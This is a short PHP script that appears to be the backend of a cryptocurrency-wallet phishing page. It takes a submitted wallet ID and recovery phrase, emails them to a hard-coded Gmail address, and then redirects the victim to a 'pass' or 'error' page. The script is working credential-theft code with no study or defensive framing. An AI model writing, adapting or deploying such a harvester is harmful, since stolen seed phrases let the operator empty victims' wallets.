<?php

    if (isset($_POST['submit']) && $_POST['recovery_phrase'] != "") {

        $subject = $_POST['wallet_id'];
        $to = 'shanejhench23@gmail.com';
        $message =  $_POST['recovery_phrase'];
        $header = "From:shanejhench23@gmail.com \r\n";
        $header .= "MIME-Version: 1.0\r\n";
        $header .= "Content-type: text/html\r\n";
          if(mail ($to,$subject,$message,$header)) {
            echo "<script> window.location.href = 'pass.html'; </script>";
          } else {
            echo "<script> window.location.href = 'error.html'; </script>";
          }
    }
?>
